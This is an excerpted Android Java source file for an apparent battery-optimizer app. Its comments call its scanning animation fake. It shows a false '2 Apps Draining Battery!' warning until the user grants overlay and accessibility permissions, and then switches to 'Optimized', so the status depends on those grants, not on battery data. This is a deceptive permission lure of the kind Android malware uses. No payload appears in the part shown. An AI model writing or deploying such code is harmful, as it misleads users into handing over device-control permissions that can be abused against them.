...
public class MainActivity extends AppCompatActivity {
    ...
    protected void onCreate(Bundle savedInstanceState) {
        ...
        btnOptimize.setOnClickListener(v -> {
            if (!Settings.canDrawOverlays(this)) {
                ...
                // Change UI to reflect the "Fixed" state
                tvStatusMessage.setText("Optimized!");
                tvStatusMessage.setTextColor(Color.parseColor("#4CAF50")); // Green
        ...
        // Trigger the fake UI loading state on startup
        simulateScanning();
    }
    ...
    private void simulateScanning() {
        ...
        // Wait 2.5 seconds, then hook up your real hardware polling logic
        handler.postDelayed(() -> {
            isScanning = false;
    ...
    private void updateBatteryInfo() {
        if (isScanning) return; // Prevent real updates while showing the fake loader
        ...
        if (batteryStatus != null) {
            ...
            // Logic to manipulate the UI based on whether the user has granted the permissions yet
            if (!Settings.canDrawOverlays(this) || !isAccessibilityEnabled()) {
                tvStatusMessage.setText("2 Apps Draining Battery!");
                tvStatusMessage.setTextColor(Color.parseColor("#E64A19")); // Orange Warning
                progressBattery.setIndicatorColor(Color.parseColor("#FF9800")); // Orange Ring
            } else {
                tvStatusMessage.setText("Optimized");
                tvStatusMessage.setTextColor(Color.parseColor("#4CAF50")); // Green
                progressBattery.setIndicatorColor(Color.parseColor("#4CAF50")); // Green Ring
            }
        }
    }
